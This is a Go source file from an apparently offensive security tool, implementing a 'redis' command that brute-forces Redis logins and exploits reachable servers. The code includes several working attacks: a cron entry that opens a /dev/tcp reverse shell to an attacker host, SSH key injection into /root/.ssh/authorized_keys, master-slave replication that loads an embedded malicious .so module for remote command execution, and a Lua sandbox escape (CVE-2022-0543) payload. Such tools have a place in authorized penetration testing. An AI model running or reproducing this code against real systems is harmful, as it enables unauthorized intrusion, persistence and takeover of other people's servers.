package cmd

// redis 6379 端口
import (
	"Yasso/config"
	"bufio"
	"context"
	"errors"
	"fmt"
	"github.com/spf13/cobra"
	"github.com/go-redis/redis/v8"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
	_ "embed"

)
//go:embed static/exp.so
var payload []byte

var RedisCmd = &cobra.Command{
	Use:   "redis",
	Short: "Redis burst and Redis extend tools (support proxy)",
	Run: func(cmd *cobra.Command, args []string) {
		if Hosts == "" && ConnHost == "" {
			_ = cmd.Help()
		} else {
			BruteRedisByUser()
		}
	},
}
var (
	RemoteHost      string
	RemotePublicKey string
	LocalHost string
	LocalPort int
	RemoteSoPath string
	IsRCE bool
	RedisRCEMethod string
)

func init() {
	RedisCmd.Flags().StringVar(&RemotePublicKey, "rekey", "", "Write public key to Redis (eg.) id_rsa.pub")
	RedisCmd.Flags().StringVar(&RemoteHost, "rebound", "", "Rebound shell address (eg.) 192.168.1.1:4444")
	RedisCmd.Flags().StringVar(&ConnHost, "hostname", "", "Redis will connect this address")
	RedisCmd.Flags().StringVar(&LoginPass, "pass", "", "set login pass")
	RedisCmd.Flags().StringVar(&SQLCommand, "sql", "", "Execute redis sql command")
	RedisCmd.Flags().StringVar(&LocalHost,"lhost","","set local listen host (target redis need connect)")
	RedisCmd.Flags().IntVar(&LocalPort,"lport",20001,"set local listen port (target redis need connect)")
	RedisCmd.Flags().StringVar(&RemoteSoPath,"so","","set target so path (not must)")
	RedisCmd.Flags().StringVar(&RedisRCEMethod,"method","rce","rce(master-slave) or lua(CVE-2022-0543)")
	RedisCmd.Flags().BoolVar(&IsRCE,"rce",false,"Whether to try rCE vulnerability")

}

func BruteRedisByUser() {
	if BrutePort == 0 {
		BrutePort = 6379
	}
	var ips []string
	var err error
	if Hosts != "" && ConnHost == "" {
		ips, err = ResolveIPS(Hosts)
		if err != nil {
			Println(fmt.Sprintf("resolve hosts address failed %v", err))
			return
		}
		if BruteFlag == true {
			users, pass := ReadTextToDic("redis", UserDic, PassDic)
			Println(Clearln + "[*] Brute Module [redis]")
			Println(Clearln + "[*] Redis Authorized crack")
			Println(fmt.Sprintf(Clearln+"[*] Have [user:%v] [pass:%v] [request:%v]", len(users), len(pass), len(users)*len(pass)*len(ips)))
			SwitchBurp("redis", users, pass, ips, BrutePort, Runtime, TimeDuration, "")
		} else {
			Println(Clearln + "[*] May be you want to brute? try to add --crack")
		}
	}
	if Hosts == "" && ConnHost != "" && (RemoteHost != "" || RemotePublicKey != "" || SQLCommand != "") {
		var (
			conn   net.Conn
			status bool
			err    error
		)
		if LoginPass != "" {
			conn, status, err = RedisAuthConn(config.HostIn{Host: ConnHost, Port: BrutePort, TimeOut: TimeDuration}, "", LoginPass)
			if err != nil {
				Println(fmt.Sprintf("Redis Auth failed %v", err))
			}
		} else {
			conn, status, err = RedisUnAuthConn(config.HostIn{Host: ConnHost, Port: BrutePort, TimeOut: TimeDuration}, "", LoginPass)
			if err != nil {
				Println(fmt.Sprintf("Redis UnAuth failed %v", err))
			}
		}
		if SQLCommand != "" {
			RedisExec(conn, SQLCommand)
			return
		}
		if status == true {
			RedisExploit(conn, RemoteHost, RemotePublicKey)
		}
	}
	if Hosts == "" && ConnHost != "" && RedisRCEMethod != "" && IsRCE == true && LocalHost != ""{
		client := InitRedisClient(ConnHost,BrutePort,LoginPass)
		if strings.ToLower(RedisRCEMethod) == "rce" && LocalHost != "" && LocalPort != 0{
			// 主从复制
			RedisRCE(client,LocalHost,LocalPort,RemoteSoPath)
		}else if strings.ToLower(RedisRCEMethod) == "lua"{
			//lua 沙盒逃逸
			RedisLua(client)
		}else{
			Println("[*] you need choose a rce method")
			return
		}
		_ = client.Close()
	} else {
		Println("[*] May be your want use redis extend ? Try to add --rekey or --rebound or --rce rce")
	}
}

// redis config

type RedisConfig struct {
	OS         string
	PID        string
	ConfigPath string
	Version    string
	DbFileName string
}

func RedisAuthConn(info config.HostIn, user, pass string) (net.Conn, bool, error) {
	var flag = false
	conn, err := GetConn(fmt.Sprintf("%s:%v", info.Host, info.Port), info.TimeOut)
	if err != nil {
		return conn, false, err
	}
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.TimeOut)))
	if err != nil {
		return conn, false, err
	}
	// 认证
	_, err = conn.Write([]byte(fmt.Sprintf("auth %s\r\n", pass)))
	if err != nil {
		return conn, false, err
	}
	reply, err := RedisReply(conn)
	if err != nil {
		return conn, false, err
	}
	if strings.Contains(reply, "+OK") {
		flag = true
		conf := RedisInfo(conn, reply)
		Println(fmt.Sprintf(Clearln+"[+] Redis %s:%v Login Success os:[%v] path:[%v] dbfilename:[%v] pid:[%v]", info.Host, info.Port, conf.OS, conf.ConfigPath, conf.DbFileName, conf.PID))
	}
	return conn, flag, nil
}

func RedisUnAuthConn(info config.HostIn, user, pass string) (net.Conn, bool, error) {
	_, _ = user, pass
	var flag = false
	conn, err := GetConn(fmt.Sprintf("%s:%v", info.Host, info.Port), info.TimeOut)
	if err != nil {
		return conn, false, err
	}
	err = conn.SetReadDeadline(time.Now().Add(time.Duration(info.TimeOut)))
	if err != nil {
		return conn, false, err
	}
	_, err = conn.Write([]byte("info\r\n"))
	if err != nil {
		return conn, false, err
	}
	reply, err := RedisReply(conn)
	if err != nil {
		return conn, false, err
	}
	if strings.Contains(reply, "redis_version") {
		flag = true
		conf := RedisInfo(conn, reply)
		Println(fmt.Sprintf("%v[+] Redis %s:%v unauthorized dbfilename:[%v] ", Clearln, info.Host, info.Port, conf.DbFileName))
	}
	return conn, flag, nil
}

func RedisReply(conn net.Conn) (string, error) {
	var (
		r   string
		err error
	)
	buf := make([]byte, 5*1024)
	for {
		count, err := conn.Read(buf)
		if err != nil {
			break
		}
		r += string(buf[0:count])
		if count < 5*1024 {
			break
		}
	}
	return r, err
}

// redis get info

func RedisInfo(conn net.Conn, reply string) RedisConfig {
	var (
		// 第0个是#Server
		//version    = strings.Split(strings.Split(reply, "\r\n")[2], ":")[1]  // redis version
		//os         = strings.Split(strings.Split(reply, "\r\n")[7], ":")[1]  // os
		//pid        = strings.Split(strings.Split(reply, "\r\n")[11], ":")[1] // redis pid
		//install    = strings.Split(strings.Split(reply, "\r\n")[18], ":")[1]
		dbfilename string
	)
	// 读取filename
	_, err := conn.Write([]byte(fmt.Sprintf("CONFIG GET dbfilename\r\n")))
	if err != nil {
		return RedisConfig{}
	}
	text, err := RedisReply(conn)
	if err != nil {
		return RedisConfig{}
	}
	text1 := strings.Split(text, "\r\n")
	if len(text1) > 2 {
		dbfilename = text1[len(text1)-2]
	} else {
		dbfilename = text1[0]
	}

	var redisConfig = RedisConfig{
		//Version:    version,
		//OS:         os,
		//PID:        pid,
		//ConfigPath: install,
		DbFileName: dbfilename,
	}
	//Println()(redisConfig)
	return redisConfig
}

// 测试利用写入是否可用

func RedisWrite(conn net.Conn) (cron bool, ssh bool, err error) {
	var reply string
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n"))) // 测试公钥写入
	if err != nil {
		return false, false, err
	}
	reply, err = RedisReply(conn)
	if err != nil {
		return false, false, err
	}
	if strings.Contains(reply, "OK") {
		ssh = true
	}
	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n"))) // 测试定时计划写入
	if err != nil {
		return false, ssh, err
	}
	reply, err = RedisReply(conn)
	if err != nil {
		return false, ssh, err
	}
	if strings.Contains(reply, "OK") {
		cron = true
	}
	return cron, ssh, nil
}

// 计划任务写入

func RedisExploit(conn net.Conn, RemoteHost string, Filename string) {
	// 测试写入
	cron, ssh, err := RedisWrite(conn)
	// 上述返回3个值，返回c,s,e,c是corn的值，s是ssh写入，e是err
	if err != nil {
		Println(fmt.Sprintf("Redis Write Testing failed %v", err))
		return
	}
	var (
		status bool
	)
	if RemoteHost != "" && cron == true {
		status, err = RedisCron(conn, RemoteHost)
		if status == true {
			Println("[+] Write Rebound shell address Success")
			return
		} else {
			Println("[x] Redis Write Rebound shell address failed")
			return
		}
	}
	if Filename != "" && ssh == true {
		status, err = RedisKey(conn, Filename)
		if status == true {
			Println("[+] Write ssh key Success")
			return
		} else {
			Println("[x] Redis ssh key failed")
			return
		}
	}
}

func RedisExec(conn net.Conn, cmd string) {
	if cmd != "" {
		_, err := conn.Write([]byte(fmt.Sprintf("%s\r\n", cmd)))
		if err != nil {
			Println(fmt.Sprintf("[!] %v", err))
			return
		}
		reply, err := RedisReply(conn)
		if err != nil {
			Println(fmt.Sprintf("[!] %v", err))
			return
		}
		Println(fmt.Sprintf("%v", string(reply)))
	}
}

func RedisCron(conn net.Conn, RemoteHost string) (bool, error) {
	c, s, _ := RedisWrite(conn)
	Println(fmt.Sprintf("[+] Redis cron %v ssh %v", c, s))
	// 先解析RemoteHost参数
	var (
		remote = strings.Split(RemoteHost, ":")
		flag   = false
		reply  string
		host   string
		port   string
	)
	if len(remote) == 2 {
		host, port = remote[0], remote[1]
	} else {
		return false, errors.New("remote host address is not like 192.160.1.1:4444")
	}
	_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /var/spool/cron/\r\n")))
	if err != nil {
		return false, err
	}
	reply, err = RedisReply(conn)
	if err != nil {
		return false, err
	}
	if strings.Contains(reply, "+OK") { // redis可写定时计划任务
		// 存在定时计划写入
		_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename root\r\n")))
		if err != nil {
			return false, err
		}
		reply, err = RedisReply(conn)
		if err != nil {
			return false, err
		}
		// 数据库设置成功
		if strings.Contains(reply, "+OK") {
			// 写入定时计划任务
			_, err = conn.Write([]byte(fmt.Sprintf("set corn \"\\n*/1 * * * * /bin/bash -i >& /dev/tcp/%v/%v 0>&1\\n\"\r\n", host, port)))
			if err != nil {
				return false, err
			}
			reply, err = RedisReply(conn)
			if err != nil {
				return false, err
			}
			if strings.Contains(reply, "+OK") {
				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
				if err != nil {
					return false, err
				}
				reply, err = RedisReply(conn)
				if err != nil {
					return false, err
				}
				if strings.Contains(reply, "OK") {
					Println("[+] save corn success")
					flag = true
				}
			}
			// 恢复原始的dbfilename
			_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename dump.rdb\r\n")))
			if err != nil {
				return false, err
			}
			reply, err = RedisReply(conn)
			if err != nil {
				return false, err
			}
			if strings.Contains(reply, "OK") {
				Println("[+] Restore the original dbfilename")
			}
		}
	}
	return flag, nil
}

// 公钥写入

func RedisKey(conn net.Conn, filename string) (bool, error) {
	var flag = false
	_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dir /root/.ssh/\r\n")))
	if err != nil {
		return false, err
	}
	reply, err := RedisReply(conn)
	if err != nil {
		return false, err
	}
	if strings.Contains(reply, "OK") {
		_, err := conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename authorized_keys\r\n")))
		if err != nil {
			return false, err
		}
		reply, err := RedisReply(conn)
		if err != nil {
			return false, err
		}
		if strings.Contains(reply, "OK") {
			key, err := ReadKeyFile(filename)
			if err != nil {
				return false, err
			}
			if len(key) == 0 {
				return false, errors.New(fmt.Sprintf("the keyfile %s is empty", filename))
			}
			_, err = conn.Write([]byte(fmt.Sprintf("set x \"\\n\\n\\n%v\\n\\n\\n\"\r\n", key)))
			if err != nil {
				return false, err
			}
			reply, err = RedisReply(conn)
			if err != nil {
				return false, err
			}
			if strings.Contains(reply, "OK") {
				// 保存
				_, err = conn.Write([]byte(fmt.Sprintf("save\r\n")))
				if err != nil {
					return false, err
				}
				reply, err = RedisReply(conn)
				if err != nil {
					return false, err
				}
				if strings.Contains(reply, "OK") {
					flag = true
				}
			}
			// 恢复原始的dbfilename
			_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename dump.rdb\r\n")))
			if err != nil {
				return false, err
			}
			reply, err = RedisReply(conn)
			if err != nil {
				return false, err
			}
			if strings.Contains(reply, "OK") {
				Println("[+] Restore the original dbfilename")
			}
		}
	}
	return flag, nil
}

func ReadKeyFile(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			return text, nil
		}
	}
	return "", err
}

func RedisRCE(client *redis.Client,LHost string,LPort int,SoPath string){
	// 设置so文件存放路径
	var dest string
	if SoPath == "" {
		dest = "/tmp/net.so"
	}else{
		dest = SoPath
	}
	Rexec(fmt.Sprintf("slaveof %v %v",LHost,LPort),client)
	fmt.Println(fmt.Sprintf("[+] slaveof %v %v",LHost,LPort))
	dbfilename,dir := getInformation(client)
	filenameDir,filename:= filepath.Split(dest)
	Rexec(fmt.Sprintf("config set dir %v",filenameDir),client)
	Rexec(fmt.Sprintf("config set dbfilename %v",filename),client)
	// 做监听
	ListenLocal(fmt.Sprintf("%v:%v",LHost,LPort))
	// 重置数据库
	reStore(client,dir,dbfilename)
	// 加载so文件
	s := Rexec(fmt.Sprintf("module load %v",dest),client)
	if s == "need unload" {
		fmt.Println("[+] try to unload")
		Rexec(fmt.Sprintf("module unload system"),client)
		fmt.Println("[+] to the load")
		Rexec(fmt.Sprintf("module load %v",dest),client)
	}
	fmt.Println("[+] module load success")
	// 循环执行命令
	reader:= bufio.NewReader(os.Stdin)
	for {
		var cmd string
		fmt.Printf("[redis-rce]» ")
		cmd,_= reader.ReadString('\n')
		cmd = strings.ReplaceAll(strings.ReplaceAll(cmd,"\r",""),"\n","")
		if cmd == "exit" {
			cmd = fmt.Sprintf("rm %v",dest)
			run(fmt.Sprintf(cmd),client)
			Rexec(fmt.Sprintf("module unload system"),client)
			fmt.Println("[+] module unload system break redis-rce")
			break
		}
		Receive(run(fmt.Sprintf(cmd),client))
	}
	os.Exit(0)
}


func RedisLua(client *redis.Client){
	reader:=bufio.NewReader(os.Stdin)
	for {
		var cmd string
		fmt.Printf("[redis-lua]» ")
		cmd,_= reader.ReadString('\n')
		cmd = strings.ReplaceAll(strings.ReplaceAll(cmd,"\r",""),"\n","")
		if cmd == "exit"{
			break
		}
		Receive(execLua(cmd,client))
	}
	os.Exit(0)
}



func Rexec(cmd string,client *redis.Client) string {
	args := strings.Fields(cmd)
	var argsInterface []interface{}
	for _,arg := range args {
		argsInterface = append(argsInterface,arg)
	}
	//Send(cmd)
	val, err := client.Do(context.Background(),argsInterface...).Result()
	return Check(val,err)
}

func getInformation(client *redis.Client)(string,string){
	r := Rexec("config get dbfilename",client)
	if !strings.HasPrefix(r,"dbfilename") {
		return "",""
	}
	dbfilename := r[11:len(r)-1]
	d := Rexec("config get dir",client)
	if !strings.HasPrefix(d,"dir") {
		return "",""
	}
	dir := d[4:len(d)-1]
	return dbfilename,dir
}


func Send(str string) {
	str = strings.TrimSpace(str)
	fmt.Println(fmt.Sprintf("[->] %v",str))
}

func Receive(str string){
	str = strings.TrimSpace(str)
	fmt.Println(fmt.Sprintf("%v",str))
}

func Check(val interface{},err error) string {
	if err != nil {
		if err == redis.Nil {
			fmt.Println("[!] key is not exist")
			return ""
		}
		fmt.Println(fmt.Sprintf("[!] %v",err.Error()))
		if err.Error( )== "ERR Error loading the extension. Please check the server logs."{
			return "need unload"
		}
		os.Exit(0)
	}
	switch v:=val.(type){
	case string:
		return v
	case []string:
		return "list result:"+strings.Join(v," ")
	case []interface{}:
		s:=""
		for _,i:=range v{
			s+=i.(string)+" "
		}
		return s
	}
	return ""
}

func ListenLocal(address string){
	var wg = &sync.WaitGroup{}
	wg.Add(1)
	addr ,err := net.ResolveTCPAddr("tcp",address)
	if err != nil {
		fmt.Println("[!] resolve tcp address failed")
		os.Exit(0)
	}
	listen,err := net.ListenTCP("tcp",addr)
	if err != nil {
		fmt.Println("[!] listen tcp address failed")
		os.Exit(0)
	}
	defer listen.Close()
	fmt.Println(fmt.Sprintf("[*] start listen in %v",address))
	c, err := listen.AcceptTCP()
	if err != nil {
		fmt.Println("[!] accept tcp failed")
		os.Exit(0)
	}
	go masterSlave(wg,c)
	wg.Wait()
	_ = c.Close()
}

func masterSlave(wg *sync.WaitGroup,c *net.TCPConn){
	defer wg.Done()
	buf := make([]byte,1024)
	for {
		time.Sleep(1 * time.Second)
		n,err := c.Read(buf)
		if err == io.EOF || n == 0 {
			fmt.Println("[*] master-slave replication process is complete")
			return
		}
		switch  {
		case strings.Contains(string(buf[:n]),"PING"):
			c.Write([]byte("+PONG\r\n"))
			//Send("+PONG")
		case strings.Contains(string(buf[:n]),"REPLCONF"):
			c.Write([]byte("+OK\r\n"))
			//Send("+OK")
		case strings.Contains(string(buf[:n]),"SYNC"):
			resp:="+FULLRESYNC "+"ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"+" 1"+"\r\n" // 垃圾字符
			resp+="$"+ fmt.Sprintf("%v",len(payload)) + "\r\n"
			rep :=[]byte(resp)
			rep = append(rep,payload...)
			rep = append(rep,[]byte("\r\n")...)
			c.Write(rep)
			//Send(resp)
		}
	}
}

func reStore(client *redis.Client,dir,dbfilename string){
	success := Rexec("slaveof no one",client)
	if strings.Contains(success,"OK"){
		fmt.Println("[+] restore file success")
	}
	Rexec(fmt.Sprintf("config set dir %v",dir),client)
	Rexec(fmt.Sprintf("config set dbfilename %v",dbfilename),client)
}

func run(cmd string,client *redis.Client)string{
	ctx:= context.Background()
	val, err := client.Do(ctx,"system.exec",cmd).Result()
	return Check(val,err)
}

func execLua(cmd string,client *redis.Client) string {
	ctx:=context.Background()
	val, err := client.Do(ctx,"eval",fmt.Sprintf(`local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("%v", "r"); local res = f:read("*a"); f:close(); return res`,cmd),"0").Result()
	return Check(val, err)
}

func InitRedisClient(host string ,port int,pass string)*redis.Client{
	rdb := redis.NewClient(&redis.Options{
		Addr:     fmt.Sprintf("%v:%v",host,port),
		Password: pass, // no password set
		DB:       0,  // use default DB
	})
	return rdb
}

